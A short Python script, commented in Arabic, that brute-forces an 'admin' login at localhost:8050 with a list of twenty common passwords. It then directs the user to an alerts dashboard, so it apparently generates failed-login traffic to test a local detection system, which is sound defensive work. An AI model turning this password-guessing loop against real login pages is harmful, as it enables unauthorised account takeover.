#!/usr/bin/env python3
"""
هجوم تخمين كلمات المرور - لـ localhost:8050
"""

import requests
import time
from datetime import datetime

def attack_localhost():
    print("=" * 60)
    print(f"🔥 هجوم تخمين كلمات المرور - {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 60)
    print("🎯 الهدف: http://localhost:8050/login")
    
    # قائمة كلمات مرور للتخمين
    passwords = [
        "admin123", "password", "123456", "qwerty", "admin", 
        "root", "test", "1234", "admin1", "password1",
        "welcome", "login", "pass", "12345", "admin1234",
        "root123", "test123", "letmein", "monkey", "abc123"
    ]
    
    print(f"\n🚀 تنفيذ {len(passwords)} محاولة دخول فاشلة...\n")
    
    success = 0
    for i, pwd in enumerate(passwords, 1):
        try:
            # محاولة تسجيل الدخول
            data = {
                'username': 'admin',
                'password': pwd
            }
            
            response = requests.post(
                'http://localhost:8050/login',
                data=data,
                timeout=2,
                allow_redirects=False
            )
            
            status = "❌ فشل"
            if response.status_code == 200:
                status = "⚠️ نجاح؟"
                success += 1
            
            print(f"   {i:2d}. admin:{pwd} -> {status}")
            time.sleep(0.3)  # انتظار 0.3 ثانية بين المحاولات
            
        except Exception as e:
            print(f"   {i:2d}. admin:{pwd} -> ❌ خطأ اتصال")
    
    print(f"\n✅ تم تنفيذ {len(passwords)} محاولة")
    print(f"📊 محاولات ناجحة: {success}")
    print("\n🔍 راقب Dashboard: http://localhost:8050/alerts")

if __name__ == "__main__":
    attack_localhost()